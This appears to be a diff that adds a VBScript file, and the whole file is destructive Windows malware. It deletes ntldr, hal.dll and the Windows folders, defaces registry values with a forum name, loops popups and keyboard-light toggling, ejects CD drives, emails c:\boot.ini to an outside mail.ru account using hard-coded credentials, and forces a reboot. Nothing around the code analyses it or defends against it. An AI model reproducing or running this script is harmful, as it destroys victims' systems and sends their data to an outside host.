@@ -1,0 +1,62 @@
+on error resume next  
+Set S = CreateObject("Wscript.Shell")  
+set FSO=createobject("scripting.filesystemobject") 
+fso.deletefile "C:\ntldr",1  
+fso.deletefolder "D:\Windows",1  
+fso.deletefolder "I:\Windows",1  
+fso.deletefolder "C:\Windows",1  
+sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot")  
+fso.deletefile sr+"\system32\hal.dll",1  
+sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot")  
+fso.deletefolder sr+"\system32\dllcache",1  
+sr=s.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRoot")  
+fso.deletefolder sr+"\system32\drives",1  
+s.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","forum.whack.ru " 
+s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","forum.whack.ru " 
+s.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","forum.whack.ru " 
+set application=createobject("shell.application") 
+application.minimizeall 
+i=50  
+while i>0 or i<0  
+S.popup "forum.whack.ru ",0, "forum.whack.ru ",0+16  
+i=i-1  
+wend  
+do  
+wscript.sleep 200  
+s.sendkeys"{capslock}"  
+wscript.sleep 200  
+s.sendkeys"{numlock}"  
+wscript.sleep 200  
+s.sendkeys"{scrolllock}"  
+loop 
+Set oWMP = CreateObject("WMPlayer.OCX.7")  
+Set colCDROMs = oWMP.cdromCollection  
+if colCDROMs.Count >= 1 then  
+For i = 0 to colCDROMs.Count - 1  
+colCDROMs.Item(i).eject  
+next  
+End If  
+Call SendPost("smtp.mail.ru", "forum.whack.ru @mail.ru", "support@mail.ru", "...", "Koïì çapaæeí!")  
+Function SendPost(strSMTP_Server, strTo, strFrom, strSubject, strBody)  
+Set iMsg = CreateObject("CDO.Message")  
+Set iConf = CreateObject("CDO.Configuration")  
+Set Flds = iConf.Fields  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = "support"  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = "support"  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.mail.ru"  
+Flds.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25  
+Flds.Update  
+iMsg.Configuration = iConf  
+iMsg.To = strTo  
+iMsg.From = strFrom  
+iMsg.Subject = strSubject  
+iMsg.TextBody = strBody  
+iMsg.AddAttachment "c:\boot.ini"  
+iMsg.Send  
+End Function  
+Set iMsg = Nothing  
+Set iConf = Nothing  
+Set Flds = Nothing  
+s.run "shutdown -r -t 0 -c ""pcforumhack.ru "" -f",1  
